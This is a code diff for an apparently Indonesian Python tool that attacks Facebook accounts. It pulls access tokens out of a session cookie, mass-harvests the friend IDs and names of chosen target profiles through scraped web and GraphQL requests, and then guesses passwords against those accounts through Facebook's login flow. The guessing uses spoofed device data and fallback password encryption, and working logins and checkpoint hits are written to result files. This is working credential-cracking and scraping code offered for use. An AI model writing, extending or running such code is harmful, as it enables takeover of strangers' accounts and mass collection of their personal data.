@@ -238,7 +238,6 @@ class Encrypt_PWD:
         if public_key is None:
             public_key, key_id = self._fetch_public_key()
             if not public_key:
-                # fallback ke #PWD_MSGR jika public key gagal
                 return self._PWD_MSGR(password)
         try:
             rand_key = get_random_bytes(32)
@@ -272,10 +271,10 @@ class Encrypt_PWD:
         hash_b64 = base64.b64encode(h.digest()).decode('utf-8')
         return f"#PWD_MSGR:2:{timestamp}:{hash_b64}"
 
-# ==================== CLASS LoginFacebook (tetap) ====================
+# ==================== CLASS LoginFacebook (DENGAN GETTOKEN BARU) ====================
 class LoginFacebook:
     def __init__(self):
-        self.url = "https://adsmanager.facebook.com/adsmanager/onboarding"
+        self.url = "https://business.facebook.com/business_locations"
 
     def login_cookie(self):
         try:
@@ -292,15 +291,22 @@ class LoginFacebook:
             try:
                 with requests.Session() as session:
                     session.cookies.set('cookie', coki)
-                    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"})
-                    response = session.get(self.url)
-                    response.raise_for_status()
-                    act = re.search(r'act=(\d+)', response.text).group(1)
-                    if not act:
-                        KenXin_Error("Invalid Cookie!!")
+                    session.headers.update({
+                        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36',
+                        'referer': 'https://www.facebook.com/',
+                        'host': 'business.facebook.com',
+                        'origin': 'https://business.facebook.com',
+                        'upgrade-insecure-requests': '1',
+                        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+                        'cache-control': 'max-age=0',
+                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+                        'content-type': 'text/html; charset=utf-8'
+                    })
+                    access_token = self.getToken(session)
+                    if not access_token:
+                        KenXin_Error("Invalid Cookie!! Gagal mendapatkan token.")
                         sleep(3)
                         self.login_cookie()
-                    access_token = self.getToken(session, act)
                     with open("data/cookie.txt", "w", encoding="utf-8") as f:
                         f.write(coki)
                     with open("data/token.txt", "w", encoding="utf-8") as f:
@@ -341,24 +347,22 @@ class LoginFacebook:
             KenXin_Error("Error: " + str(e).title())
             sys.exit()
 
-    def getToken(self, session, act):
+    def getToken(self, session):
         try:
-            params = {
-                'act': act,
-                'breakdown_regrouping': '1',
-                'nav_source': 'no_referrer'
-            }
-            response = session.get(self.url, params=params)
-            token = re.search(r'__accessToken\s*=\s*"([^"]+)"', response.text).group(1)
-            if not token:
-                KenXin_Warning("Akses token tidak ditemukan")
-                sys.exit()
-            return token
+            response = session.get(self.url)
+            find_token = re.search(r'(EAAG\w+)', response.text)
+            if find_token:
+                return find_token.group(1)
+            else:
+                return None
+        except requests.exceptions.ConnectionError:
+            KenXin_Error("Tidak ada koneksi!")
+            return None
         except Exception as e:
-            KenXin_Error("Error: " + str(e).title())
-            sys.exit()
+            KenXin_Error("Error mendapatkan token: " + str(e))
+            return None
 
-# ==================== CLASS Facebook (dengan smartlock_login yang diperbaiki) ====================
+# ==================== CLASS Facebook (DUMP MASSAL & CRACK) ====================
 class Facebook:
     def __init__(self, cookie, token, nama, uid):
         self.cookie = cookie
@@ -409,7 +413,7 @@ class Facebook:
     def logo(self):
         Banner()
         rprint(Panel(f"[bold white]Name: [bold red]{self.nama}[/bold red]\nUid: [bold red]{self.idz}[/bold red]\nAccessToken: [bold red]{self.token[:20]}***[/]", style="bold bright_black", title="[bold bright_black]>> [Account Info] <<[/]", width=80))
-        rprint(Panel("[bold white][01] Dump id publik\n[02] Crack dari file dump (userid<=>fullname)\n[03] Check result crack\n[04] Crack dari file user|pass\n[00] Logout[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Tools Menu] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
+        rprint(Panel("[bold white][01] Dump id publik (bisa massal)\n[02] Crack dari file dump (userid<=>fullname)\n[03] Check result crack\n[04] Crack dari file user|pass\n[00] Logout[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Tools Menu] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
 
     def menu(self):
         self.logo()
@@ -437,54 +441,169 @@ class Facebook:
             sleep(3)
             self.menu()
 
-    # ==================== MENU 1: DUMP ID PUBLIK ====================
-    def dumpId_public(self, after=''):
+    # ==================== MENU 1: DUMP ID PUBLIK (MASSAL DENGAN KOMA) ====================
+    def dumpId_public(self):
         try:
-            rprint(Panel("[bold white]Masukan id target, pastikan pertemanan target bersifat publik dan memiliki teman[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Dump User] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
-            targetId = KenXinInput()
-            if not targetId:
+            rprint(Panel("[bold white]Masukan id target, bisa lebih dari satu (pisahkan dengan koma).\nContoh: 1000123456789,1000987654321\nPastikan pertemanan target bersifat publik dan memiliki teman[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Dump User] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
+            input_ids = KenXinInput()
+            if not input_ids:
                 KenXin_Warning("Target jangan kosong!")
                 sleep(3)
-                self.dumpId_public(after)
-            with requests.Session() as s:
-                s.cookies.set("cookie", self.cookie)
-                s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"})
-                while True:
-                    params = {
-                        "after": after,
-                        "pretty": 1,
-                        "access_token": self.token,
-                        "limit": ""
-                    }
-                    try:
-                        response = s.get('https://graph.facebook.com/v16.0/{}/friends'.format(targetId), params=params).json()
-                        for user in response['data']:
-                            userid = user.get('id')
-                            fullname = user.get('name')
-                            temp_dump.append(f"{userid}<=>{fullname}\n")
-                            open(f'temp/dump-{targetId}.txt', 'a', encoding='utf-8').write(f"{userid}<=>{fullname}\n")
-                        rprint(f"[bold white]# berhasil mengumpulkan {len(temp_dump)} user...[/]", end='\r')
-                        cursors = response.get('paging', {}).get('cursors', {})
-                        if 'after' in cursors:
-                            after = cursors['after']
-                        else:
-                            break
-                    except KeyboardInterrupt:
-                        KenXin_Warning("Proses dihentikan oleh pengguna!")
-                        break
-                    except Exception as e:
-                        KenXin_Error("Error: " + str(e).title())
-                        break
-                self.settings()
+                self.dumpId_public()
+                return
+
+            # Split koma dan bersihkan
+            id_list = [x.strip() for x in input_ids.split(',') if x.strip()]
+            if not id_list:
+                KenXin_Warning("Tidak ada ID valid!")
+                sleep(3)
+                self.dumpId_public()
+                return
+
+            global temp_dump
+            temp_dump.clear()  # hapus data dump sebelumnya
+
+            for targetId in id_list:
+                rprint(f"[bold yellow]\nMemproses ID: {targetId}...[/]")
+                self._dump_friends_web(targetId)
+
+            # Simpan hasil gabungan
+            timestamp = datetime.now().strftime("%H%M%S")
+            file_path = f'temp/dump-massal-{timestamp}.txt'
+            with open(file_path, 'w', encoding='utf-8') as f:
+                for entry in temp_dump:
+                    f.write(entry + '\n')
+            rprint(f"[bold green]\n✓ Dump massal selesai: {len(temp_dump)} teman dari {len(id_list)} akun tersimpan ke {file_path}[/]")
+            sleep(1)
+            self.settings()
+
         except Exception as e:
             KenXin_Error("Error: " + str(e).title())
+            sleep(2)
+            self.menu()
+
+    # ==================== METODE DUMP WEB (TANPA CLEAR DI DALAM) ====================
+    def _dump_friends_web(self, userid):
+        # Tidak ada temp_dump.clear() di sini agar bisa akumulasi massal
+        try:
+            with requests.Session() as r:
+                r.headers.update({
+                    'sec-fetch-mode': 'navigate',
+                    'sec-fetch-site': 'none',
+                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                    'sec-fetch-user': '?1',
+                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
+                    'accept-language': 'en-US,en;q=0.9',
+                    'sec-fetch-dest': 'document',
+                    'Host': 'web.facebook.com',
+                })
+                response = r.get(
+                    f'https://web.facebook.com/profile.php?id={userid}&sk=friends_all',
+                    cookies={'cookie': self.cookie}
+                ).text
+
+                if '"items":{"count":' not in response:
+                    rprint(f"[bold red]   ╰─>[bold red] Akun @{userid} Tidak Ada Teman![/]")
+                    time.sleep(2.5)
+                    return
+
+                total_teman = re.search(r'"items":{"count":(.*?)}', response).group(1)
+                rprint(f"[bold blue]   ╰─>[bold white] Memiliki[bold green] {total_teman}[bold white] Teman...", end='\r')
+                time.sleep(1.5)
+
+                find_friends = re.findall(r'"id":"(\d+)","friendship_status":".*?","__isNode":".*?","gender":".*?","name":"(.*?)"', response)
+                __user = re.search(r'"USER_ID":"(\d+)"', response).group(1)
+                fb_dtsg = re.search(r'"DTSGInitData",\[\],{"token":"(.*?)"', response).group(1)
+                jazoest = re.search(r'jazoest=(\d+)"', response).group(1)
+                lsd = re.search(r'"LSD",\[\],{"token":"(.*?)"', response).group(1)
+                cursor = re.search(r'"page_info":{"end_cursor":"(.*?)"', response).group(1)
+                ids = re.search(r'"collectionToken":"(.*?)",', response).group(1)
+
+                for uid, name in find_friends:
+                    if uid in [x.split('<=>')[0] for x in temp_dump] or len(name) > 40:
+                        continue
+                    temp_dump.append(f"{uid}<=>{name}")
+                    rprint(f"[bold blue]   ╰─>[bold yellow] Dump @{uid[:20]}/{len(temp_dump)} Username...         ", end='\r')
+                    time.sleep(0.0007)
+
+                self._next_cursor_friends(userid, __user, fb_dtsg, jazoest, lsd, cursor, ids)
+
+        except KeyboardInterrupt:
+            rprint("\r                                                                   ", end='\r')
+        except RecursionError:
+            KenXin_Error("RecursionError saat dump!")
+            time.sleep(2)
+        except json.decoder.JSONDecodeError:
+            KenXin_Error("JSONDecodeError saat dump!")
+            time.sleep(2)
+        except Exception as e:
+            KenXin_Error(f"Error saat dump {userid}: {str(e)}")
+            time.sleep(2)
+
+    def _next_cursor_friends(self, userid, __user, fb_dtsg, jazoest, lsd, cursor, ids):
+        global temp_dump
+        with requests.Session() as r:
+            r.headers.update({
+                'content-type': 'application/x-www-form-urlencoded',
+                'sec-fetch-mode': 'cors',
+                'origin': 'https://web.facebook.com',
+                'sec-fetch-site': 'same-origin',
+                'accept': '*/*',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
+                'x-asbd-id': '198387',
+                'accept-language': 'en-US,en;q=0.9',
+                'sec-fetch-dest': 'empty',
+                'x-fb-friendly-name': 'ProfileCometAppCollectionListRendererPaginationQuery',
+                'Host': 'web.facebook.com',
+                'referer': f'https://web.facebook.com/profile.php?id={userid}&sk=friends_all',
+                'x-fb-lsd': lsd,
+            })
+            data = {
+                '__user': __user,
+                'fb_api_req_friendly_name': 'ProfileCometAppCollectionListRendererPaginationQuery',
+                'lsd': lsd,
+                'variables': json.dumps({"count":8,"cursor":cursor,"scale":1.5,"search":None,"id":ids}),
+                'jazoest': jazoest,
+                'doc_id': '6118528884928354',
+                'fb_dtsg': fb_dtsg,
+            }
+            response = r.post(
+                'https://web.facebook.com/api/graphql/',
+                data=data,
+                cookies={'cookie': self.cookie}
+            )
+            find_all_user = re.findall(
+                r'"gender":".*?","name":"(.*?)",.*?"__typename":"User","id":"\d+","__isEntity":"User","url":"https://web.facebook.com/(.*?)"}',
+                response.text
+            )
+            for name, url in find_all_user:
+                if 'profile.php?id=' in url:
+                    uid = url.split('profile.php?id=')[1]
+                else:
+                    uid = url.split('/')[-1] if '/' in url else url
+                if uid in [x.split('<=>')[0] for x in temp_dump] or len(name) > 40:
+                    continue
+                temp_dump.append(f"{uid}<=>{name}")
+                rprint(f"[bold blue]   ╰─>[bold green] Dump @{uid[:20]}/{len(temp_dump)} Username...         ", end='\r')
+                time.sleep(0.0007)
+
+            if '"end_cursor"' in response.text and '"has_next_page":true' in response.text:
+                try:
+                    next_match = re.search(r'"end_cursor":"(.*?)","has_next_page":true}},"id":"(.*?)"', response.text)
+                    if next_match:
+                        self._next_cursor_friends(
+                            userid, __user, fb_dtsg, jazoest, lsd,
+                            next_match.group(1), next_match.group(2)
+                        )
+                except AttributeError:
+                    KenXin_Error("AttributeError saat paginasi!")
 
     # ==================== MENU 2: CRACK DARI FILE DUMP ====================
     def crack_from_dump_file(self):
         rprint(Panel("[bold white]Crack dari file dump (format: userid<=>fullname)\n[1] Pilih dari file dump yang tersimpan di folder temp\n[2] Masukkan path file manual[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Crack Dump File] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
         pilihan = KenXinInput()
         if pilihan == '1':
-            temp_files = [f for f in os.listdir("temp") if f.startswith("dump-") and f.endswith(".txt")]
+            temp_files = [f for f in os.listdir("temp") if f.endswith(".txt")]
             if not temp_files:
                 KenXin_Warning("Tidak ada file dump di folder temp!")
                 sleep(2)
@@ -765,13 +884,12 @@ class Facebook:
 
         return passwords
 
-    # ==================== METODE SMARTLOCK (VERSI BARU DENGAN GRAPHQL + FALLBACK) ====================
+    # ==================== METODE SMARTLOCK LOGIN (CRACKING) ====================
     def smartlock_login(self, user, passwords):
         global log
         rprint(f'[bold bright_black]   ──> [bold white]Crack {user[:8]}/{len(temp_dump)}/[bold green]{log["success"]}[/bold green]/[bold yellow]{log["checkpoint"]}[/bold yellow]/{log["loop"]}[/]', end='\r')
         for pwd in passwords:
             try:
-                # Enkripsi password (otomatis fallback ke MSGR jika perlu)
                 encrypted_pass = self.enc.PWD_FB4A(pwd)
                 ua_str, loc = self.generate_facebook_user_agent()
                 session = requests.Session()
@@ -794,7 +912,6 @@ class Facebook:
                     'x-fb-server-cluster': 'True',
                 }
 
-                # Generate random IDs
                 device_id = str(uuid.uuid4())
                 family_id = str(uuid.uuid4())
                 secure_family_id = str(uuid.uuid4())
@@ -908,7 +1025,6 @@ class Facebook:
                     "client_trace_id": trace_id,
                 }
 
-                # Gzip payload
                 data_str = urlencode(payload)
                 compressed_data = gzip.compress(data_str.encode('utf-8'))
                 headers["x-fb-ta-logging-ids"] = f"graphql:{trace_id}"
@@ -922,7 +1038,6 @@ class Facebook:
                 )
                 resp_json = response.json()
 
-                # Ekstrak bloks_action
                 bloks_str = None
                 try:
                     action = resp_json.get('data', {}).get('fb_bloks_action', {}).get('root_action', {}).get('action', {})
@@ -933,11 +1048,9 @@ class Facebook:
                 except:
                     pass
 
-                # Jika tidak ada bloks_str atau terjadi encryption_retry, fallback ke MSGR
                 if not bloks_str or 'encryption_retry' in bloks_str:
                     rprint('[bold yellow]encryption_retry detected, fallback to #PWD_MSGR...[/]', end='\r')
                     encrypted_pass = Encrypt_PWD._PWD_MSGR(pwd)
-                    # Update password di payload (ulangi request)
                     client_input_params["password"] = encrypted_pass
                     params_dict["client_input_params"] = client_input_params
                     params_json = json.dumps(params_dict, separators=(',', ':'), ensure_ascii=False)
@@ -947,7 +1060,6 @@ class Facebook:
                     data_str = urlencode(payload)
                     compressed_data = gzip.compress(data_str.encode('utf-8'))
                     headers["Content-Length"] = str(len(compressed_data))
-                    # Generate trace_id baru
                     trace_id = str(uuid.uuid4())
                     headers["x-fb-ta-logging-ids"] = f"graphql:{trace_id}"
                     payload["client_trace_id"] = trace_id
@@ -958,7 +1070,6 @@ class Facebook:
                         timeout=30
                     )
                     resp_json = response.json()
-                    # Ekstrak ulang
                     try:
                         action = resp_json.get('data', {}).get('fb_bloks_action', {}).get('root_action', {}).get('action', {})
                         bundle = action.get('action_bundle', {})
@@ -982,7 +1093,6 @@ class Facebook:
                         open(file_result['checkpoint'], 'a', encoding='utf-8').write(f"{user}|{pwd}\n")
                         break
                     else:
-                        # gagal, lanjut password berikutnya
                         continue
 
             except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
@@ -990,7 +1100,6 @@ class Facebook:
                 time.sleep(5)
                 continue
             except Exception as e:
-                # Jika ada error lain, lanjut ke password berikutnya
                 continue
         log['loop'] += 1
 
